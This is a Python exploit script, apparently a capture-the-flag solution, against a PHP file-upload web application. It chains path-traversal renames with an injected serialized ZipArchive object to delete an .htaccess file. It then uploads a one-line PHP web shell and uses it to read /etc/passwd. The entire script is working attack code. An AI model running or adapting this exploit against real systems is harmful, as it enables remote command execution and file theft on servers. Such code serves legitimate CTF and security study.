#!/usr/bin/env python2

import requests
import urllib

URL = "http://your-ip:8088/"
s = requests.Session()

def upload(name, content="GARBAGE"):
    files = {'file': (name, content)}
    params = { "action" : "upload" }
    s.post(URL, params=params, files=files)
def rename(index, new_name):
    data = { "newname" : new_name }
    params = {
        "action" : "changename",
        "i" : index
    }
    s.post(URL, params=params, data=data)

def open_file(index):
    params = {
        "action" : "open",
        "i" : index
    }
    return s.get(URL, params=params).text

newname = "../" * 117 # To overwrite fakename #2
serialized_injection = '";s:1:"e";s:0:"";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/c3451b1e2562a1c184999e208ccd312e319cd195/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'

# Upload 2 files
upload("A")
upload("B")

# Rename to inject serialized ZipArchiver
rename(1, serialized_injection)
rename(0, newname)

print " === Cookie === "
print urllib.unquote(s.cookies['files'])

# Upload a shell
upload("shell.php", "<?php system($_GET[cmd]); ?>")

# Cookie received

# Trigger .htaccess removal
open_file(1)

shell_url = URL + "sandbox/c3451b1e2562a1c184999e208ccd312e319cd195/fe95113d494997061044e7142af542e84f3eebbf.php"

response = requests.get(shell_url, params={"cmd" : "cat /etc/passwd"})
flag = response.text
print flag